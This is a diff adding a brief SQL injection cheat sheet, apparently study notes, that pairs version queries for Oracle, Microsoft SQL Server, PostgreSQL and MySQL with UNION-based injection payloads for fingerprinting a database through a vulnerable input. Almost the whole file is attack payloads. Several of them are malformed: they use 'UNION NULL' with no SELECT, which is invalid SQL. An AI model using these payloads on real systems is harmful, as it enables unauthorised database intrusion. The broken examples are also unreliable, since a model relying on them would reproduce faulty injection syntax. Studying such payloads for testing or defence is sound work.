@@ -1,0 +1,19 @@
+Oracle:
+SELECT banner FROM v$version
+e.g. xyz' UNION NULL, banner, NULL from v$version -- 
+
+SELECT version FROM v$instance
+e.g. xyz' UNION NULL, version, NULL from v$instance -- 
+
+Microsoft:
+SELECT @@version
+e.g. xyz' UNION NULL, @@version, NULL -- 
+
+PostgreSQL:
+SELECT version()
+e.g. xyz' UNION NULL, version(), NULL -- 
+
+
+MySQL:
+SELECT @@version 
+xyz' UNION SELECT @@version,NULL --
